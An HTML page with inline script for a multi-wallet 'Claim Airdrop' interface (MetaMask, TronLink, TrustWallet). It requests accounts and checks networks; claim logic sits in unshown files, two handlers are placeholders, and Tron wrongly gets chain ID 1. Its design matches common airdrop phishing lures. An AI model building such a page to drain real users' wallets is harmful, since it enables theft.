<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Integration</title>
    <link rel="stylesheet" href="css/styles.css">
    <script src="https://cdn.jsdelivr.net/npm/@metamask/detect-provider/dist/detect-provider.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"></script>
</head>
<body>

<h1>Connect your Wallet</h1>
<button id="connectButton">Connect MetaMask</button>
<button id="claimAirdropButton" disabled>Claim Airdrop (ETH)</button>
<button id="connectTronlinkButton">Connect TronLink</button>
<button id="claimTronAirdropButton" disabled>Claim Airdrop (TRON)</button>
<button id="connectTrustwalletButton">Connect TrustWallet</button>
<button id="claimTrustwalletAirdropButton" disabled>Claim Airdrop (BSC)</button>

<script>
  // Function to dynamically load scripts
  function loadScript(src, callback) {
    const script = document.createElement('script');
    script.src = src;
    script.onload = callback;
    document.head.appendChild(script);
  }

  // Function to load ABI and config files dynamically based on the network
  async function loadConfigAndABI(network) {
    const configMap = {
      eth: { config: 'config/eth_config.json', abi: 'abi/eth_abi.json' },
      bsc: { config: 'config/bsc_config.json', abi: 'abi/bsc_abi.json' },
      tron: { config: 'config/tron_config.json', abi: 'abi/tron_abi.json' },
    };

    const { config, abi } = configMap[network];
    try {
      const configData = await fetch(config).then((res) => res.json());
      const abiData = await fetch(abi).then((res) => res.json());

      console.log(`Loaded config for ${network}:`, configData);
      console.log(`Loaded ABI for ${network}:`, abiData);

      return { config: configData, abi: abiData };
    } catch (error) {
      console.error(`Error loading config or ABI for ${network}:`, error);
      alert(`Failed to load configuration for ${network}.`);
    }
  }

  // Function to check if wallet is on the correct network
  async function checkNetwork(web3, expectedChainId) {
    const networkId = await web3.eth.net.getId();
    if (networkId !== expectedChainId) {
      alert(`You are connected to the wrong network. Please switch to the correct network.`);
      return false;
    }
    return true;
  }

  // Common function to handle wallet connections and load required scripts dynamically
  function handleWalletConnection(network, walletScript, connectionCallback, expectedChainId) {
    // Load common.js first
    loadScript('js/common.js', function () {
      console.log('common.js script loaded');

      // Load the specific wallet script (e.g., MetaMask, TronLink, TrustWallet)
      loadScript(walletScript, function () {
        console.log(`${network} wallet script loaded`);

        // Load config and ABI for the selected network
        loadConfigAndABI(network).then(({ config, abi }) => {
          if (config && abi) {
            // Pass the config and ABI to the connection callback
            connectionCallback(config, abi, expectedChainId);
          }
        });
      });
    });
  }

  // MetaMask Connection Logic
  function connectMetaMask(config, abi, expectedChainId) {
    if (window.ethereum) {
      const web3 = new Web3(window.ethereum);
      window.ethereum.request({ method: 'eth_requestAccounts' }).then(async (accounts) => {
        console.log("Connected to MetaMask:", accounts);

        // Check if the wallet is on the correct network (Ethereum)
        const validNetwork = await checkNetwork(web3, expectedChainId);
        if (validNetwork) {
          document.getElementById('claimAirdropButton').disabled = false;
          document.getElementById('connectButton').disabled = true;
        }
      }).catch((error) => {
        console.error("MetaMask connection failed:", error);
        alert("Failed to connect to MetaMask.");
      });
    } else {
      alert("MetaMask is not installed. Please install it to continue.");
    }
  }

  // TronLink Connection Logic (Placeholder)
  function connectTronLink(config, abi, expectedChainId) {
    console.log("Connecting to TronLink...");
    // Add TronLink-specific logic here (network check, etc.)
  }

  // TrustWallet Connection Logic (Placeholder)
  function connectTrustWallet(config, abi, expectedChainId) {
    console.log("Connecting to TrustWallet...");
    // Add TrustWallet-specific logic here (network check, etc.)
  }

  // Add event listeners for each button
  document.addEventListener('DOMContentLoaded', function () {
    // MetaMask Button
    document.getElementById('connectButton').addEventListener('click', function () {
      handleWalletConnection('eth', 'js/metamask.js', connectMetaMask, 1);  // Ethereum Mainnet chainId is 1
    });

    // TronLink Button
    document.getElementById('connectTronlinkButton').addEventListener('click', function () {
      handleWalletConnection('tron', 'js/tronlink.js', connectTronLink, 1);  // Use Tron mainnet or custom chainId for Tron
    });

    // TrustWallet Button
    document.getElementById('connectTrustwalletButton').addEventListener('click', function () {
      handleWalletConnection('bsc', 'js/trustwallet.js', connectTrustWallet, 56);  // BSC chainId is 56
    });
  });
</script>

</body>
</html>


